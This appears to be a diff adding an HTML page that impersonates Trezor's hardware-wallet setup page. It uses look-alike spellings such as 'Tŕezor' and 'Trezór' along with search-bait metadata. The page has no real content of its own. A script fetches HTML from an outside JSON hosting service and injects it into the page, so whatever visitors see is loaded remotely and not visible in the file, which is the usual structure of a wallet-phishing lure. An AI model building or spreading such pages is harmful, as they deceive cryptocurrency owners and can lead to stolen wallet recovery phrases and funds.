@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Tŕezor.io/Start® — Starting Up Your Device — Tŕezor®</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Learn how to set up your Trezór account using Trezór.io/Start. Secure your Trezór wallet quickly and easily today.">
+  <meta name="keywords" content="Trezór.io/Start, Trezór wallet, Trezór suite, Trezór bridge">
+  <style>
+html, body {
+margin: 0 !important;
+padding: 0 !important;
+width: 100% !important;
+background-color: black !important;
+}
+
+#jsonsilo-content {
+margin: 0;
+padding: 0;
+width: 100%;
+display: flex;
+justify-content: center;
+align-items: center;
+flex-direction: column;
+}
+
+#jsonsilo-content img {
+width: 100%;
+height: auto;
+display: block;
+}
+
+/* Optional: Remove any outer container padding */
+.container, .content, .page, .main {
+margin: 0 !important;
+padding: 0 !important;
+max-width: 100% !important;
+}
+</style>
+
+<div id="jsonsilo-content"></div>
+
+<script>
+fetch('https://api.jsonsilo.com/public/98c7c5d5-b47a-400f-ae98-d19d5a725223')
+.then(response => response.json())
+.then(data => {
+document.getElementById('jsonsilo-content').innerHTML = data.content || '<p>Unable to load content.</p>';
+})
+.catch(error => {
+document.getElementById('jsonsilo-content').innerHTML = '<p>Error loading content.</p>';
+console.error(error);
+});
+</script>
+</head>head>
+    <body>
+  </body>
+</html>
